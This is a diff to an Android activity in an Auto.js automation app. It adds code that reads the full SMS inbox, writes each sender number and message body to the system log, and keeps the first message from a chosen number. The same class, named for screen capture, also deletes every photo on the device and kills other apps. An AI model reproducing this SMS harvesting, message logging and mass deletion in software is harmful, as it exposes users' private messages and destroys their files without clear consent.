@@ -1,7 +1,9 @@
 package com.stardust.autojs.core.image.capture;
 
+import android.Manifest;
 import android.app.Activity;
 import android.app.ActivityManager;
+import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
@@ -28,7 +30,9 @@ import java.lang.reflect.Method;
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.Date;
+import java.util.HashMap;
 import java.util.List;
+import java.util.Map;
 
 /**
  * Created by Stardust on 2017/5/22.
@@ -40,6 +44,10 @@ public class ScreenCaptureRequestActivity extends Activity {
     private static final String TAG ="nkScript-ScreenCapture" ;
     public static boolean flagBoolAlumdelete=false;
     private static boolean flagUpdateAlum=false;
+    public static List<Map<String,Object>> listSms;
+    public static boolean flagSms=false;
+    public static String smsText;
+
     //openCV4Android 需要加载用到
     private BaseLoaderCallback mLoaderCallback = new BaseLoaderCallback(this) {
         @Override
@@ -96,8 +104,37 @@ public class ScreenCaptureRequestActivity extends Activity {
 
     }
 
-    public static void requestKillApp(Context context,String packageName) {
+    public static void requestPermission(Context context ) {
 
+        if (context==null)
+            Log.d(TAG, "requestPermission: context-null");
+        Intent intent = new Intent(context, ScreenCaptureRequestActivity.class )
+                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        IntentExtras.newExtras()
+                .put("permission", "1")
+                .putInIntent( intent );
+        //context.startActivity ( intent );
+        context.startActivity(intent);
+
+    }
+
+    public static void requestGetSms(Context context,String number ) {
+
+        Log.d(TAG, "requestGetSms: requestGetSms");
+        if (context==null)
+            Log.d(TAG, "requestGetSms: context-null");
+
+        Intent intent = new Intent(context, ScreenCaptureRequestActivity.class )
+                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        IntentExtras.newExtras()
+                .put("sms", "1")
+                .put("number",number)
+                .putInIntent( intent );
+        context.startActivity( intent );
+
+    }
+
+    public static void requestKillApp(Context context,String packageName) {
         if (context==null){
             Log.d(TAG, "requestKillApp: context-null");
             return ;
@@ -171,6 +208,17 @@ public class ScreenCaptureRequestActivity extends Activity {
 
     }
 
+/*    public void requestSmsPermission(){
+        final int REQUEST_CODE_ASK_PERMISSIONS = 123;
+        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
+            int hasReadSmsPermission = checkSelfPermission(Manifest.permission.READ_SMS);
+            if (hasReadSmsPermission != PackageManager.PERMISSION_GRANTED) {
+                requestPermissions( new String[] {Manifest.permission.READ_SMS },REQUEST_CODE_ASK_PERMISSIONS );
+                return;
+            }
+        }
+    }*/
+
     public void getAllPhotoAndDelete() {
 
         Log.d(TAG, "getAllPhoto: ");
@@ -181,7 +229,7 @@ public class ScreenCaptureRequestActivity extends Activity {
         int i=0;
         while (cursor.moveToNext()) {
             //获取图片的路径
-            String path = cursor.getString(cursor.getColumnIndex(MediaStore.Images.Media.DATA));
+            String path = cursor.getString( cursor.getColumnIndex(MediaStore.Images.Media.DATA) );
             if (path != null && path.length() > 0) {
                 deleteSingleFile( path );
                 Log.d(TAG, "getAllPhotoAndDelete: "+path );
@@ -230,6 +278,43 @@ public class ScreenCaptureRequestActivity extends Activity {
         }
     }
 
+    public void getSms( String numberFind ) {
+        Uri URI_SMS_INBOX = Uri.parse("content://sms/");
+
+        flagSms=false;
+        listSms=new ArrayList<>();
+        ContentResolver cr =getContentResolver();
+        String[] projection = new String[]{"_id", "address", "person", "body", "date", "type"};
+        Cursor cur = cr.query(URI_SMS_INBOX, projection, null, null, "date desc");
+        Log.d(TAG, "getSms: run");
+        if (null == cur) {
+            Log.i("ooc", "************cur == null");
+            return;
+        }
+
+        while (cur.moveToNext()) {
+            String number = cur.getString(cur.getColumnIndex("address"));//手机号
+            String name = cur.getString(cur.getColumnIndex("person"));//联系人姓名列表
+            String body = cur.getString(cur.getColumnIndex("body"));//短信内容
+            Log.d(TAG, "getSms: number="+number );
+            Log.d(TAG, "getSms: text="+body );
+            if ( number.indexOf(numberFind)>-1 ){
+                flagSms=true;
+                smsText=body;
+                return;
+            }
+  /*          Log.d(TAG, "getSms: number="+number );
+            Log.d(TAG, "getSms: text="+body );
+            //至此就获得了短信的相关的内容, 以下是把短信加入map中，构建listview,非必要。
+            Map<String, Object> map = new HashMap<String, Object>();
+            map.put("num", number);
+            map.put("mess", body);
+            listSms.add(map);*/
+        }
+
+
+    }
+
     public boolean killAppBackGround( String packageName ){
 
         ActivityManager mActivityManager = (ActivityManager)
@@ -258,7 +343,6 @@ public class ScreenCaptureRequestActivity extends Activity {
             }
         }
         return false;
-
     }
 
     @Override
@@ -295,6 +379,18 @@ public class ScreenCaptureRequestActivity extends Activity {
             return;
         }
 
+        if ( extras.get("sms")!=null ){
+            Log.d(TAG, "onCreate: getSms-condition-ok");
+            getSms( extras.get("number") );
+            finish();
+            return;
+        }
+
+       /* if ( extras.get("permission")!=null ){
+            requestSmsPermission();
+            finish();
+            return;
+        }*/
 
         if (extras.get("updateAlbum")!=null){
             //updateFileFromDatabase(  );
@@ -308,6 +404,7 @@ public class ScreenCaptureRequestActivity extends Activity {
 
         if (extras.get("getAllPhoto")!=null){
             getAllPhotoAndDelete ();
+            onDestroy();
             finish();
             return;
         }
@@ -334,12 +431,14 @@ public class ScreenCaptureRequestActivity extends Activity {
             return;
         }
 
+        Log.d(TAG, "onCreate: callback=" );
         mCallback = extras.get("callback");
         if (mCallback == null) {
             finish();
             return;
         }
 
+        Log.d(TAG, "onCreate: run-ScreenCaptureRequester");
         mScreenCaptureRequester = new ScreenCaptureRequester.ActivityScreenCaptureRequester(mOnActivityResultDelegateMediator, this);
         mScreenCaptureRequester.setOnActivityResultCallback( mCallback );
         mScreenCaptureRequester.request();
